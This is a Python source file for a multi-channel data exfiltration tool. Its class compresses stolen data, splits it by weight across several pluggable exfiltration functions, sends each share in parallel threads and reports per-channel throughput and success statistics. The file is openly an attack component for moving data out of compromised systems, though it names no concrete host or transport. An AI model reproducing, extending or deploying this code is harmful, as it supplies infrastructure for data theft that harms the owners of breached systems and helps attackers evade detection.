"""
Multi-Channel Exfiltration
Split data across multiple exfiltration channels
"""

import threading
from typing import List, Callable, Dict
import time

class MultiChannelExfil:
    """
    Exfiltrates data across multiple channels simultaneously
    """
    
    def __init__(self):
        self.channels = []
        self.results = {}
    
    def add_channel(self, name: str, exfil_function: Callable, weight: float = 1.0):
        """
        Add an exfiltration channel
        
        Args:
            name: Channel identifier
            exfil_function: Function that performs exfiltration
            weight: Proportion of data to send through this channel (0-1)
        """
        self.channels.append({
            'name': name,
            'function': exfil_function,
            'weight': weight
        })
    
    def exfiltrate(self, data: bytes, compress: bool = True) -> Dict:
        """
        Exfiltrate data across all channels
        """
        if compress:
            import zlib
            data = zlib.compress(data)
        
        # Normalize weights
        total_weight = sum(c['weight'] for c in self.channels)
        
        # Split data according to weights
        chunks = self._split_by_weight(data, total_weight)
        
        print(f"[*] Multi-channel exfiltration starting")
        print(f"    Channels: {len(self.channels)}")
        print(f"    Total data: {len(data)} bytes")
        
        # Start threads for each channel
        threads = []
        
        for i, channel in enumerate(self.channels):
            chunk = chunks[i]
            
            thread = threading.Thread(
                target=self._channel_worker,
                args=(channel, chunk),
                daemon=False
            )
            thread.start()
            threads.append(thread)
        
        # Wait for all channels to complete
        for thread in threads:
            thread.join()
        
        # Summarize results
        total_sent = sum(r.get('bytes_sent', 0) for r in self.results.values())
        success_count = sum(1 for r in self.results.values() if r.get('success', False))
        
        print(f"\n[+] Multi-channel exfiltration complete")
        print(f"    Successful channels: {success_count}/{len(self.channels)}")
        print(f"    Total bytes sent: {total_sent}")
        
        return self.results
    
    def _split_by_weight(self, data: bytes, total_weight: float) -> List[bytes]:
        """Split data according to channel weights"""
        chunks = []
        offset = 0
        
        for i, channel in enumerate(self.channels):
            if i == len(self.channels) - 1:
                # Last channel gets remaining data
                chunks.append(data[offset:])
            else:
                # Calculate chunk size
                proportion = channel['weight'] / total_weight
                chunk_size = int(len(data) * proportion)
                
                chunks.append(data[offset:offset + chunk_size])
                offset += chunk_size
        
        return chunks
    
    def _channel_worker(self, channel: Dict, data: bytes):
        """Worker thread for individual channel"""
        name = channel['name']
        exfil_func = channel['function']
        
        print(f"[*] Channel '{name}': Starting ({len(data)} bytes)")
        
        start_time = time.time()
        
        try:
            exfil_func(data)
            
            elapsed = time.time() - start_time
            
            self.results[name] = {
                'success': True,
                'bytes_sent': len(data),
                'time_seconds': elapsed,
                'bytes_per_second': len(data) / elapsed if elapsed > 0 else 0
            }
            
            print(f"[+] Channel '{name}': Complete ({elapsed:.1f}s)")
            
        except Exception as e:
            self.results[name] = {
                'success': False,
                'error': str(e),
                'bytes_sent': 0
            }
            
            print(f"[!] Channel '{name}': Failed - {str(e)}")
    
    def get_statistics(self) -> Dict:
        """Get statistics about exfiltration"""
        stats = {
            'total_channels': len(self.channels),
            'successful_channels': 0,
            'failed_channels': 0,
            'total_bytes': 0,
            'total_time': 0,
            'fastest_channel': None,
            'slowest_channel': None,
            'by_channel': {}
        }
        
        for name, result in self.results.items():
            if result.get('success'):
                stats['successful_channels'] += 1
                stats['total_bytes'] += result['bytes_sent']
                
                # Track fastest/slowest
                bps = result.get('bytes_per_second', 0)
                if not stats['fastest_channel'] or bps > stats['fastest_channel']['bps']:
                    stats['fastest_channel'] = {'name': name, 'bps': bps}
                if not stats['slowest_channel'] or bps < stats['slowest_channel']['bps']:
                    stats['slowest_channel'] = {'name': name, 'bps': bps}
            else:
                stats['failed_channels'] += 1
            
            stats['by_channel'][name] = result
        
        return stats
